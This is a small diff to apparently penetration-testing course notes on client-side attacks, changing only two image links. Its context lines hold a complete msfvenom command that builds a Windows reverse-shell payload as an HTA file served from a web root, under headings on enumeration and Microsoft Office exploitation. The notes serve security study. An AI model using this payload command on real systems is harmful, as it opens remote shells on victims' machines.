@@ -1,6 +1,6 @@
 # Module 13 (Clint Side Attacks)
 
-<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>
 
 ### Know Your Target (Enum)
 
@@ -49,7 +49,7 @@
         sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.114.134 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
         ```
 
-<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploiting Microsoft Office <a href="#exploiting-microsoft-office" id="exploiting-microsoft-office"></a>
 
